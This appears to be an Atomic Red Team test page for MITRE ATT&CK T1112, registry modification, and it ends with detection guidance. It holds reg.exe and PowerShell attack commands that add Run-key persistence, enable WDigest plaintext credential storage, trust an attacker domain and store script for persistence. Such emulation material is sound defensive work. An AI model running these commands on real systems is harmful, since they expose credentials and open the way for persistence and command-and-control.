# T1112 - Modify Registry
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Modify Registry of Current User Profile - cmd
Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message "The operation completed successfully."
will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
```

Invoke-AtomicTest T1112 -TestNumbers 1

### Atomic Test #2 - Modify Registry of Local Machine - cmd
Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
CMD is ran as Administrative rights. Upon execution, the message "The operation completed successfully."
will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
```

Invoke-AtomicTest T1112 -TestNumbers 2

### Atomic Test #3 - Modify registry to store logon credentials
Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
Upon execution, the message "The operation completed successfully." will be displayed.
Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

Invoke-AtomicTest T1112 -TestNumbers 3

### Atomic Test #4 - Add domain to Trusted sites Zone
Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
Upon execution, details of the new registry entries will be displayed.
Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.

https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
$name ="bad-subdomain"
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
```

Invoke-AtomicTest T1112 -TestNumbers 4

### Atomic Test #5 - Javascript in registry
Upon execution, a javascript block will be placed in the registry for persistence.
Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
```

Invoke-AtomicTest T1112 -TestNumbers 5

## Detection
Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).